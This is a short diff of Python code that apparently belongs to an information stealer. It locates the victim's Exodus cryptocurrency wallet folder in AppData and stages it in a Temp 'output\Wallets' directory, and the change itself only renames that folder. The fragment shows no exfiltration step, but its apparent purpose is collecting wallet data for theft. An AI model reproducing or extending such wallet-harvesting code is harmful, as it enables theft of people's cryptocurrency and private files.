@@ -19,7 +19,7 @@ def copy_directory(src, dst):
 
 def exo():
     exodus_path = os.path.join(user, "AppData\\Roaming\\Exodus")
-    temp_exodus_path = os.path.join(user, "AppData\\Local\\Temp\\output\\Wallet\\Exodus")
+    temp_exodus_path = os.path.join(user, "AppData\\Local\\Temp\\output\\Wallets\\Exodus")
 
     if os.path.exists(exodus_path):
         
